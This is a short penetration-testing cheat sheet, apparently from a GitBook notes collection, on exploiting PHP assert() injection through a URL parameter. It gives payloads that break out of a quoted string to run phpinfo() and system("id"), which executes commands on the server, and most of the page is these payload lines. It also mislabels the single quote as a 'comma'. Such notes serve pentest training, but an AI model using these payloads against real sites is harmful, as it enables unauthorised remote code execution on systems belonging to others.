# Asset () in PHP

Sometimes, you will see an Assert() error when you inject ' (Comma) or something else. This is some payloads that you could try.

```bash
# In PHP, you could try to get any error by inserting a ' comma'
https://<URL>/?name=hacker'  
```

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

```bash
# Try the payload
https://<URL>/?name=hacker'.phpinfo().'
https://<URL>/?name=hacker'.system("id").'
```
